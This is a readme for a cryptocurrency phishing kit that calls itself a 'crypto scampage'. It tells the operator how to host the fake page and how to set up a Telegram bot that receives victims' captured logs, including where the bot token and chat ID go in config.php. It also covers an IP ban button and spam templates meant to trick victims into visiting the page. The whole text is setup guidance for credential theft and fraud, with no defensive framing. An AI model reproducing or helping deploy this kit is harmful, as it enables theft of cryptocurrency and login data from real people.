crypto scampage


1. Telegram bot panel setup
2. Ban button explained
3. Spam templates explained

----------------------------------------------------------------------------

Upload this page like any other page in the file manager of your server/host and link your domain.
Make sure to put the files directly in the first folder of your server/host or the ban button will not work
If you get any problem with accessing the page try removing the antibot folder in the /files.
 
Telegram BOT panel setup 
All logs come inside a telegram bot and you can set it up like this. 
 
1. Message @botfather on telegram 
( t.me/botfather ) 
 
2. Create a bot like this 
 
2.1 select or type /newbot 
 
2.2 Enter a name for example: Randomname 
 
2.3 Enter a username for example: yourname_bot 
 
3. You will get a api key that looks like this: 
 
11111111111111:euuxbeiwososbx1626gdhdvsbdjdhdhdhhs 
 
4. Copy this key 
 
5. Look in the page files for /config/config.php and open it 
 
(You can open the file with notepad++ or any other text/code editor)  
 
6. Search for the line where you can see  /* bot token */  
(line 2) 
 
7. Paste your api key between the "" 
 
8. Send a message (/start) to t.me/userinfobot or t.me/useridinfobot
 
9. You will receive your telegram userid  
 
10. Copy this code  
 
11. Open the config.php file again 
 
12. Find the line that says /* chatid */ 
(line 3) 
 
13. Enter your userid between the "" 
 
14. Your code in config.php should look like this: 
 
<?php
$tg_bot_token = "PASTE YOUR API KEY HERE"; /* bot token */  
$tg_chat_id = "PASTE YOUR TELEGRAM USER ID HERE"; /* chatid */  
 
?> 
15. message your bot or press /start and your bot is ready to go

-------------------------------------------------------------------------------------------------------

2. Ban button

There is a ban and unban button in the telegram bot it blocks the ip of the log. The unban 
button doesnt unban the selected ip but cleans the whole banlist due to an error made by
the coder so its best leave an ip banned once banned or remove it manually from the ips.txt file

------------------------------------------------------------------------------------------------------

3. Spam templates 
This page comes with spam templates (these concepts can be send to your victims to trick them  easier).

You can view the templates by entering the following links.

WWW.YOUR-URL.COM/warning
WWW.YOUR-URL.COM/support